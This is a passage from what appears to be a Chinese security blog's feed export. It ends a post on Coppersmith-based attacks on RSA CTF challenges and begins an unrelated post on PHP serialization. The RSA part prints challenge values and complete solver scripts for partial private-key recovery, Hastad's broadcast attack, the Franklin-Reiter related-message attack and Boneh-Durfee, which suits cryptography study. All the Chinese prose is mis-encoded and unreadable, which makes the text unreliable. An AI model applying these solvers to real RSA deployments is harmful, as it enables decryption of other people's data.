e, n)</span>:</span></span><br><span class="line">    X = var(<span class="string">'X'</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        results = solve_mod([e*d0*X == k*n*X + k*X + X-k*X**<span class="number">2</span> - k*n], <span class="number">2</span>^d0.nbits())</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            p = recover_p(p0, n)</span><br><span class="line">            <span class="keyword">if</span> p <span class="keyword">and</span> p != <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n =</span><br><span class="line">e = </span><br><span class="line">c =</span><br><span class="line">d0 =</span><br><span class="line">p = int(find_p0(d0, e, n))</span><br><span class="line">print(<span class="string">"found p: "</span>, p)</span><br><span class="line">q = n//int(p)</span><br><span class="line">print(<span class="string">"found d: "</span>, inverse_mod(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>)))</span><br></pre></td></tr></table></figure><h3 id="ç¬¬å››å…³ï¼šHastadâ€™s-Broadcast-Attack"><a href="#ç¬¬å››å…³ï¼šHastadâ€™s-Broadcast-Attack" class="headerlink" title="ç¬¬å››å…³ï¼šHastadâ€™s Broadcast Attack"></a>ç¬¬å››å…³ï¼šHastadâ€™s Broadcast Attack</h3><p>å·²çŸ¥n1,c1,n2,c2,n3,c3,e=3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge <span class="number">4</span></span><br><span class="line">[+]e=<span class="number">3</span></span><br><span class="line">[+]m=random.getrandbits(<span class="number">512</span>)</span><br><span class="line">[+]n1=<span class="number">0x1819da5abb8b8158ad6c834cb8fd6bc3ed9a3bd3e33b976344173f1766bf909bda253f18c9d9640570152707e493e3d3d461becc7197367ab702af33d67805e938321915f439e33f616b41781c54c101f05db0760cc8ca0f09063f3142b5b31f6aa062f1e60bba1a45e3720ab462ebd31e1228f5c49ae3de8172bad77b2d5b57L</span></span><br><span class="line">[+]c1=pow(m,e,n1)=<span class="number">0x7841e1b22f4d571b722807007dc1d550a1970a32801c4649e83f4b99a01f70815b3952a34eadc1ec8ba112be840e81822f1c464b1bb4b24b168e5cb38016469548c5afd8c1bdb55402d1208f3201a2a4098aef305a8380b8c5b6b5b17d9fb65a6bdfdcf21abc063924a6512f18f1dc22332dfc87f4a00925daf1988d43aaecdL</span></span><br><span class="line">[+]n2=<span class="number">0x6d1164ffa8cb2b7818b5ac90ef121b94e38fd5f93636b212184717779c45581f13c596631b23781de82417f9c8126be4a04ab52a508397f9318c713e65d08961d172f24f877f48ef9e468e52e3b5b17cbbe81646903d650f703c51f2ad0928dd958700b939e1fd7f590f26a6d637bd9ef265d027e7364c4e5e40a172ce970021L</span></span><br><span class="line">[+]c2=pow(m,e,n2)=<span class="number">0x58f26614932924c81d30ef2389d00cf2115652ced08d59e51619207a7836fd3908b3179fc0df03fe610059c1fe001ca421e01e96afc47147d77bbbe6a3f51c5c06f1baeab8dc245c2567a603f87dea0a053b8f5df4e68f28896d7d1ba3dd3dcd7c4652d59404fa237f4868e1bbc9ae529196739486d86bd1723a78dfac781fe5L</span></span><br><span class="line">[+]n3=<span class="number">0xde53be1db600264b0c3511ae4939c82164ea1166aadfd8dd0af6e15eb9df79a5d1a2757d3d15630441790ecf834098a1cf4b5858003f0b7f3a72823de014ac0a7c827ed1ca4185b245774f442a05dee3fe6bf846e5b035caf3b3c574b88911b7e5b81fc2c638729240f949e09a25a3a4a762c31005684791577d5e9fc8221abdL</span></span><br><span class="line">[+]c3=pow(m,e,n3)=<span class="number">0x89f9fabc7e8d6f0e92d31109ea4c024446b323d9f441d72db4eb296eba3011abe2a58e68ec21a663e6493981e21835a826f28d1bc28d3476273ff733ef69c152e7fbfebc826132266f6eb65c86b242417c06eb31453f99ed7e075ababbfc208d042a2436a766f24eb9af0f45b60eea2c4405edfabd87584806bc0a1a51f9ca7aL</span></span><br><span class="line">[-]long_to_bytes(m).encode(<span class="string">'hex'</span>)=</span><br></pre></td></tr></table></figure><p>å¯¹äºè¿™ä¸€å…³ï¼Œç”±äºæˆ‘ä»¬çŸ¥é“$m$æ˜¯512bitçš„ï¼Œè€Œç”¨äºåŠ å¯†çš„$e$ç­‰äº3ï¼Œå› æ­¤ä¸‰ä¸ª$c$å³ä¸º$m^3$ åœ¨ä¸åŒæ¨¡ä¸‹çš„å‰©ä½™ã€‚ç”±äº$m^3ä¸º512 * 3=1536bit$ï¼Œè€Œå¯ä»¥çŸ¥é“çš„æ˜¯ä¸‰ä¸ªæ¨¡nçš„bité•¿åº¦åˆ†åˆ«ä¸º1021ï¼Œ1023ï¼Œ1024ã€‚æ‰€ä»¥åˆ©ç”¨ä¸­å›½å‰©ä½™å®šç†ã€å…·ä½“åŸç†å¯ä»¥çœ‹ä¿ºè¿™ä¸€ç¯‡<a href="https://www.anquanke.com/post/id/194137" target="_blank" rel="noopener">æ–‡ç« </a>ã€‘æˆ‘ä»¬æ˜¯å¯ä»¥è¿˜åŸé•¿åº¦ä¸º$1536bit$çš„$m^3$çš„ï¼Œæœ€åæˆ‘ä»¬å†å¼€ä¸ªä¸‰æ¬¡æ ¹å°±å¥½å¾—åˆ°$m$äº†ã€‚</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (reduce(gcd,mi)==<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M / m) * invert(M / m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span> iroot(CRT([n1,n2,n3],[c1,c2,c3]),<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>ä½†æ—¢ç„¶è¿™é‡Œè®²çš„æ˜¯coppersmithâ€˜s methodï¼Œé‚£ä¹ˆæˆ‘ä»¬å†æ¥çœ‹çœ‹å¦‚ä½•ç”¨coppersmithâ€˜s methodæ¥è§£å†³è¿™é“ä½æŒ‡æ•°å¹¿æ’­æ”»å‡»çš„é—®é¢˜ã€‚</p><p>æˆ‘ä»¬å†çœ‹åˆ°è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æœ‰ä¸‰æ¡å¼å­ï¼Œåˆ†åˆ«æ˜¯</p><p>$m^3\equiv c_1 \pmod{n_1}$</p><p>$m^3\equiv c_2 \pmod{n_2}$</p><p>$m^3\equiv c_3 \pmod{n_3}$</p><p>ç„¶åå‰é¢çš„æ–¹æ³•æ˜¯æˆ‘ä»¬ç”¨äº†ä¸€ä¸ªCRTï¼Œæ±‚å¾—åˆ°äº†ä¸€ä¸ªC æ»¡è¶³$m^3 \equiv C \pmod{N}$ï¼Œå…¶ä¸­$N=\prod_{i=0}^{3}n_i $ï¼Œè€Œç”±äºNè¿‡å¤§ï¼Œå¯¼è‡´è¿™ä¸ªåŒä½™å¼ç­‰åŒäºç­‰å¼ï¼Œå› æ­¤æˆ‘ä»¬æ‰å¯ä»¥ç›´æ¥å¯¹Cå¼€ä¸‰æ¬¡æ ¹ï¼Œæ±‚å¾—mã€‚</p><p>è€Œç”¨coppersmithâ€˜s methodæ¥è§£å†³è¿™é“é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥å°†é—®é¢˜æ¨å¹¿åˆ°æ›´ä¸€èˆ¬çš„æƒ…å†µï¼Œå°±æ˜¯åŠ å¯†çš„ä¸å†æ˜¯ç›¸åŒçš„mï¼Œè€Œæ˜¯å…·æœ‰çº¿æ€§å…³ç³»çš„$m_i$ï¼Œæ¯”å¦‚ï¼š$e = 3,m_i = mï¼Œm+1ï¼Œ2m+2 $æˆ‘ä»¬å°±æœ‰ä¸‰æ¡å¼å­</p><p>$m^3\equiv c_1 \pmod{n_1} =&gt; f(m)=m^3-c_1\equiv 0 \pmod{n_1}$</p><p>$(m+1)^3\equiv c_2 \pmod{n_2} =&gt; f(m)=(m+1)^3-c_2\equiv 0 \pmod{n_2}$</p><p>$(2m+2)^3\equiv c_3 \pmod{n_3} =&gt; f(m)=(2m+2)^3-c_3\equiv 0 \pmod{n_3}$</p><p>åŒæ ·ï¼Œç”±äºè¿™é‡Œçš„$n_i$å½¼æ­¤äº’ç´ ï¼Œå› æ­¤åˆ©ç”¨CRTæˆ‘ä»¬æœ€ç»ˆä¹Ÿèƒ½å¾—åˆ°ä¸€ä¸ªå¼å­$f(x) \equiv 0 \pmod{N}$</p><p>mæ˜¾ç„¶ä¼šæ˜¯è¿™ä¸ªå¼å­çš„è§£ï¼Œè€Œåˆç”±äº$m&lt;N^{\frac{1}{3}}$ï¼Œå› æ­¤åˆ©ç”¨coppersmithâ€˜s methodæˆ‘ä»¬å¯ä»¥æ±‚è§£å¾—mã€‚</p><p>expæ¥è‡ª<a href="https://ycdxsb.cn/2decc525.html" target="_blank" rel="noopener">é£Ÿå…”äººçš„åšå®¢â€”â€”CTFä¸­çš„RSAåŸºæœ¬å¥—è·¯</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Cs = []</span><br><span class="line">Ns =  []</span><br><span class="line">A=  [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">B= [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">e= <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># solve</span></span><br><span class="line">cnt = e</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(ZZ)</span><br><span class="line">x = PR.gen()</span><br><span class="line">Fs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(cnt):</span><br><span class="line">    f =  (A[i]*x + B[i])**e - Cs[i]</span><br><span class="line">    ff = f.change_ring(Zmod(Ns[i]))</span><br><span class="line">    ff = ff.monic()</span><br><span class="line">    f = ff.change_ring(ZZ)</span><br><span class="line">    Fs.append(f)</span><br><span class="line"></span><br><span class="line">F = crt(Fs, Ns)</span><br><span class="line">M = reduce( <span class="keyword">lambda</span> x, y: x * y, Ns )</span><br><span class="line">FF = F.change_ring(Zmod(M))</span><br><span class="line">m = FF.small_roots()</span><br><span class="line">print(<span class="string">"m: "</span>,m)</span><br></pre></td></tr></table></figure><h3 id="ç¬¬äº”å…³ï¼šRelated-Message-Attack"><a href="#ç¬¬äº”å…³ï¼šRelated-Message-Attack" class="headerlink" title="ç¬¬äº”å…³ï¼šRelated Message Attack"></a>ç¬¬äº”å…³ï¼šRelated Message Attack</h3><p>å·²çŸ¥n,e=3ï¼Œmå¯¹åº”çš„å¯†æ–‡c1ï¼Œ(m+1)å¯¹åº”çš„å¯†æ–‡c2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge <span class="number">5</span></span><br><span class="line">[+]n=<span class="number">0xf2e5339236455e2bc1b1bd12e45b9341a3b223ddb02dec11c880fa4aa8835df9e463e4c446292cd5a2fe19b10017856654b6d6c3f3a94a95807712329f7dae2e1e6506094d5d2f9c8a05c35cbf3366330996db9bff930fe566016d5e850e232057d419292ce30df9c135d56ef1bb72c38838d4b127aa577ceb4aba94d4e0d55L</span></span><br><span class="line">[+]e=<span class="number">3</span></span><br><span class="line">[+]m=random.getrandbits(<span class="number">512</span>)</span><br><span class="line">[+]c=pow(m,e,n)=<span class="number">0x7175f2614b8d1a27b43f7c3873b3422658af28291ddc88b15f97f499e00cd4c5c4fd980f062376a61e5dd4c15d52d73262d3c066f1e8f46a04af6fead7c3960d2768a0d214bbc3e05d2f6e56aee158071574e55753624a19e094590fc3f9918a2065cd5ff7693e0d34517bc0072e6c9e444e66c4ece88d657f99e44bee48924L</span></span><br><span class="line">[+]x=pow(m+<span class="number">1</span>,e,n)=<span class="number">0xd5f4af36b5391bd731cfa4313466024ab1bc3b455024a5d8b218faba0e956252f01c4d01bd36765035c33d73e5af7f178aeb2606edf86814d74082c64828fa4c1666b69d05fab69dd1ef47b243356290fdb74e001f54edec70681cf52319c73bce9acda4803a9e97597ca21d60072c2d2b516f161bec1f6a91baa2e24c7655bL</span></span><br><span class="line">[-]long_to_bytes(m).encode(<span class="string">'hex'</span>)=</span><br></pre></td></tr></table></figure><p>åŒç¬¬å››å…³ä¸€æ ·ï¼Œè¿™ä¸€é¢˜ä¹Ÿæœ‰å¤šè§£ï¼Œä¸€ç§æ˜¯åƒä¸€å¶é£˜é›¶å¸ˆå‚…<a href="https://www.anquanke.com/post/id/158944" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>æ‰€è¿°ï¼Œç›´æ¥ç¡¬åŒ–å…¬å¼</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getM2</span><span class="params">(a,b,c1,c2,n)</span>:</span></span><br><span class="line">    a3 = pow(a,<span class="number">3</span>,n)</span><br><span class="line">    b3 = pow(b,<span class="number">3</span>,n)</span><br><span class="line">    first = c1-a3*c2+<span class="number">2</span>*b3</span><br><span class="line">    first = first % n</span><br><span class="line">    second = <span class="number">3</span>*b*(a3*c2-b3)</span><br><span class="line">    second = second % n</span><br><span class="line">    third = second*gmpy.invert(first,n)</span><br><span class="line">    third = third % n</span><br><span class="line">    fourth = (third+b)*gmpy.invert(a,n)</span><br><span class="line">    <span class="keyword">return</span> fourth % n</span><br><span class="line"></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">-1</span></span><br><span class="line">c1 =</span><br><span class="line">c2 =</span><br><span class="line">n =</span><br><span class="line">m = a*getM2(a,b,c1,c2,n) + b</span><br><span class="line"><span class="keyword">print</span> hex(m)</span><br></pre></td></tr></table></figure><p>å¦ä¸€ç§æ˜¯æ±‚å¤šé¡¹å¼ä¸‹çš„GCDï¼Œ</p><p>é¦–å…ˆè¿™ä¸€é¢˜æˆ‘ä»¬å¯ä»¥å°†å·²çŸ¥çš„ä¿¡æ¯è½¬æ¢ä¸€ä¸‹ï¼Œæˆ‘ä»¬è®¾$M_1 = m$ï¼Œ$M_2 = m+1$ï¼›å†å˜æ¢ä¸€ä¸‹ï¼Œè®¾$M_1=x$ï¼Œé‚£ä¹ˆ$M_2 = ax+b $ ã€$a=b=1$ã€‘</p><p>å¦‚æœæˆ‘ä»¬æœ‰æ˜ å°„å…³ç³»$f(x)=ax+b$ï¼Œé‚£ä¹ˆå°±æœ‰$M_2 = f(M_1)$ï¼Œå› æ­¤é¢˜é¢</p><p>$m^3-c_1 \equiv 0 \pmod n$</p><p>$(m+1)^3-c_2 \equiv 0 \pmod n$</p><p>å¯ä»¥å˜æˆæ±‚è§£ä¸€ä¸ªæ–¹ç¨‹ç»„</p><p> $X^3-c_1 \equiv 0 \pmod n$     â‘ </p><p>$f(X)^3-c_2 \equiv 0 \pmod n$     â‘¡</p><p>æ˜¾ç„¶å¯¹äºè¿™ä¸¤ä¸ªå¤šé¡¹å¼æœ‰ä¸€ä¸ªå…¬å…±è§£ï¼š$M_1$ï¼Œå› æ­¤ä¸¤æ¡å¼å­éƒ½å¯ä»¥åŒ–æˆ</p><p>$(X - M_1) * K_1 \equiv 0 \pmod n$</p><p>$(X-M_1) * K_2 \equiv 0 \pmod n$ ã€$K_i$ä»£è¡¨æœªçŸ¥çš„å¤šé¡¹å¼ã€‘</p><p>å†ç”±â‘ ã€â‘¡å¼çš„å•è°ƒæ€§å¯çŸ¥ï¼Œâ‘ ã€â‘¡å¼åœ¨å®æ•°åŸŸä¸‹ä»…ç”±å”¯ä¸€è§£ï¼Œå› æ­¤$K_1ã€K_2$å¼å‡ä¸å¯å†å› å¼åˆ†è§£ï¼Œå› æ­¤å…¶å½¼æ­¤äº’ç´ </p><p>ä»è€Œæˆ‘ä»¬å¯¹è¿™ä¸¤ä¸ªå¤šé¡¹å¼æ±‚ä¸€ä¸ªGCDå°±å¯ä»¥å¾—åˆ°$ï¼ˆX-M_1ï¼‰$,ä½†ç”±äºåœ¨æ¨¡$n$ä¸‹ï¼Œå¾—åˆ°çš„å°†æ˜¯$X+Mâ€™$çš„å½¢å¼ ã€$Mâ€™ \equiv -M_1 \pmod n$ã€‘ï¼Œæ‰€ä»¥æœ€ç»ˆ$M = -Mâ€™ \pmod n$</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">franklinReiter</span><span class="params">(n,e,b,c1,c2)</span>:</span></span><br><span class="line">    R.&lt;X&gt; = Zmod(n)[]</span><br><span class="line">    f1 = X^e - c1</span><br><span class="line">    f2 = (X + b)^e - c2</span><br><span class="line">    m_ = GCD(f1,f2).coefficients()[<span class="number">0</span>] <span class="comment"># è¿”å›çš„æ˜¯é¦–ä¸€å¤šé¡¹å¼ï¼Œcoefficients()è¿”å›å¤šé¡¹å¼å„é¡¹å¼çš„ç³»æ•°ï¼Œé¡¹å¼æ¬¡æ•°é€’å¢ï¼Œæ‰€ä»¥ç¬¬0é¡¹æ˜¯å¸¸æ•° </span></span><br><span class="line">    <span class="keyword">return</span> Integer(n - m_) <span class="comment"># ç”±äºtmpå…¶å®æ˜¯ -m % n,æ‰€ä»¥è¿™é‡Œç»™ä»–è½¬æ¢å›å»ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCD</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()<span class="comment"># è¿”å›é¦–ä¸€å¤šé¡¹å¼ï¼Œå³å¤šé¡¹å¼æœ€é«˜æ¬¡çš„é¡¹å¼ç³»æ•°ä¸º1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> GCD(b, a % b)</span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line">b = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">M = franklinReiter(n,e,b,c1,c2)</span><br><span class="line">print(M)</span><br></pre></td></tr></table></figure><h3 id="ç¬¬å…­å…³ï¼šBoneh-Durfee-Attack"><a href="#ç¬¬å…­å…³ï¼šBoneh-Durfee-Attack" class="headerlink" title="ç¬¬å…­å…³ï¼šBoneh Durfee Attack"></a>ç¬¬å…­å…³ï¼šBoneh Durfee Attack</h3><p>å·²çŸ¥n,e,cï¼Œdåªæœ‰1024  *  0.27bit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge <span class="number">6</span></span><br><span class="line">[+]n=<span class="number">0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L</span></span><br><span class="line">[+]d=random.getrandbits(<span class="number">1024</span>*<span class="number">0.270</span>)</span><br><span class="line">[+]e=invmod(d,phin)</span><br><span class="line">[+]hex(e)=<span class="number">0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL</span></span><br><span class="line">[+]m=random.getrandbits(<span class="number">512</span>)</span><br><span class="line">[+]c=pow(m,e,n)=<span class="number">0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL</span></span><br><span class="line">[-]long_to_bytes(m).encode(<span class="string">'hex'</span>)=</span><br></pre></td></tr></table></figure><p>ç»§ç»­æ¥æ¨å¼å­ï¼š</p><p>$âˆµed=k\phi(n)+1$</p><p>$âˆ´k\phi(n)+1\equiv 0 \pmod{e}$</p><p>$âˆ´k(N+1-p-q)+1\equiv 0 \pmod{e}$</p><p>$âˆ´2k(\frac{N+1}{2}+\frac{-p-q}{2})+1\equiv 0 \pmod{e}$</p><p>è®¾$A=\frac{N+1}{2}ï¼Œy=\frac{-p-q}{2}),x=2k$ï¼Œå¯å¾—å¼å­ï¼š$f(k,y)=1+x * (A+y)$</p><p>å¦‚æœæˆ‘ä»¬èƒ½åœ¨æ¨¡$e$ä¸‹è§£å¾—è¯¥æ–¹ç¨‹çš„æ ¹$x,y$ï¼Œç”±$ed=1+x * (A+y)$å°±å¯ä»¥å¾—åˆ°$d$äº†ã€‚</p><p>ä½†å…·ä½“æ€ä¹ˆå»æ±‚è§£è¿™ä¸ªæ–¹ç¨‹å‘¢ï¼Ÿè¿™å°±æ¶‰åŠå¤šå…ƒcoppersmithâ€™s methodäº†ï¼Œè¶…çº²äº†å–ï¼Œæ‰€ä»¥è¿™é‡Œå…ˆç”¨äº†githubä¸Šçš„ä¸€ä¸ªè„šæœ¬<a href="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage" target="_blank" rel="noopener">boneh_durfee.sage</a>ã€‚è¿™é‡Œçš„é€‚ç”¨æ¡ä»¶æ˜¯$d&lt;N^{0.292}$</p><h1 id="æ€è€ƒ-amp-æ€»ç»“"><a href="#æ€è€ƒ-amp-æ€»ç»“" class="headerlink" title="æ€è€ƒ&amp;æ€»ç»“"></a>æ€è€ƒ&amp;æ€»ç»“</h1><p>â€‹        åœ¨coppersmithâ€™s methodçš„è¾¹ç•Œè®¡ç®—ä¸­ï¼Œç”±äºæ¨ç†ä¸­å­˜åœ¨çš„ä¸ç­‰å¼ï¼Œæ ¼åŸºè§„çº¦ç®—æ³•åœ¨ä¸åŒæƒ…å†µæœ‰ä¸åŒçš„è¡¨ç°ç­‰é—®é¢˜ï¼Œå¯¼è‡´coppersmithâ€™s methodçš„è¾¹ç•Œå…¶å®æ¯”è¾ƒæ¨¡ç³Šï¼Œè€Œæ„é€ ä¸åŒçš„æ ¼ä¹Ÿä¼šè®¡ç®—å‡ºä¸åŒçš„è¾¹ç•Œå€¼ï¼Œæœ‰ä¸åŒçš„æ•ˆæœã€‚æ‰€ä»¥ï¼Œåœ¨è€ƒè™‘æ—¶é—´å’Œç©ºé—´å¤æ‚åº¦çš„æƒ…å†µä¸‹ï¼Œæ˜¯å¦ä¼šå­˜åœ¨æŸç§æœ€ä¼˜çš„æ„é€ æ–¹æ³•å‘¢ï¼Ÿ</p><p>â€‹        å¥½äº†ï¼Œè¿™é‡Œå¤§æ¦‚æ˜¯å¤§éƒ¨åˆ†çš„å¯¹å•å…ƒcoppersmithâ€™s methodçš„åº”ç”¨å®ä¾‹äº†ã€‚æœ€åä¸€æ‰‹Boneh Durfee Attackåˆ©ç”¨äº†å¤šå…ƒcoppersmithâ€˜s methodï¼Œè¿™ç®—æ˜¯åŸ‹äº†ä¸€æ‰‹ä¼ç¬”ä¹ˆï¼Ÿ</p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> Rsa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Coppersmithâ€™s Method </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webå­¦ä¹ ç¬”è®° ä¹‹ æ–‡ä»¶ä¸åºåˆ—åŒ–</title>
      <link href="/2020/08/09/Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8E%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2020/08/09/Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8E%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="æ–‡ä»¶ä¸åºåˆ—åŒ–"><a href="#æ–‡ä»¶ä¸åºåˆ—åŒ–" class="headerlink" title="æ–‡ä»¶ä¸åºåˆ—åŒ–"></a>æ–‡ä»¶ä¸åºåˆ—åŒ–</h1><p>&emsp;&emsp;è¿™ä¸€ç« çš„æ ‡é¢˜æ˜¯æ–‡ä»¶ä¸åºåˆ—åŒ–ï¼Œå› ä¸ºååºåˆ—åŒ–çš„åˆ©ç”¨æ€»æ˜¯è¦ç”¨åˆ°unserialize()è¿™ä¸ªå‡½æ•°ã€‚è€Œåœ¨å®é™…åœºæ™¯ä¸­è¿™ä¸ªå‡½æ•°ä¹Ÿè®¸å¹¶ä¸å¸¸è§ï¼Œä½†æ˜¯å¦‚æœæœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹çš„è¯ï¼Œå…´è®¸æ˜¯å¯ä»¥åˆ©ç”¨pharä¼ªåè®®çš„ã€‚æ‰€ä»¥æˆ‘æƒ³è¿ç€æ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶åŒ…å«ä¸€èµ·æ•´ç†ä¸‹ã€‚</p><h2 id="åºåˆ—åŒ–-amp-ååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–-amp-ååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–&amp;ååºåˆ—åŒ–"></a>åºåˆ—åŒ–&amp;ååºåˆ—åŒ–</h2><p>&emsp;&emsp;åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå¦‚æœé‡åˆ°éœ€è¦å°†æ•°æ®å­˜å‚¨ï¼Œå¹¶ä¸”è¦ä¿æŒä»–åŸæ¥çš„ç±»å‹å°±éœ€è¦ç”¨åˆ°åºåˆ—åŒ–ã€‚æ¯”å¦‚å°†ä¸€ä¸ªå¯¹è±¡åºåˆ—åŒ–ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯å°†è¿™ä¸ªå¯¹è±¡ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ï¼Œæ–¹ä¾¿ä¸‹æ¬¡ä½¿ç”¨çš„æ—¶å€™æ¢å¤ã€‚ä¸¾ä¸ªæ —å­å°±æ˜¯ï¼Œä½ æƒ³å°†å˜é‡$a = 1å­˜èµ·æ¥ï¼Œä¸‹æ¬¡å¥½ç›´æ¥ç”¨ã€‚å¦‚æœä½ åªæ˜¯æŠŠä»–ä»¥å­—ç¬¦ä¸²çš„å½¢å¼å­˜è¿›äº†æ–‡ä»¶ï¼šâ€œ$a = 1â€ï¼Œé‚£ä¹ˆä¸‹æ¬¡è¯»å–æ–‡ä»¶çš„æ—¶å€™ä½ 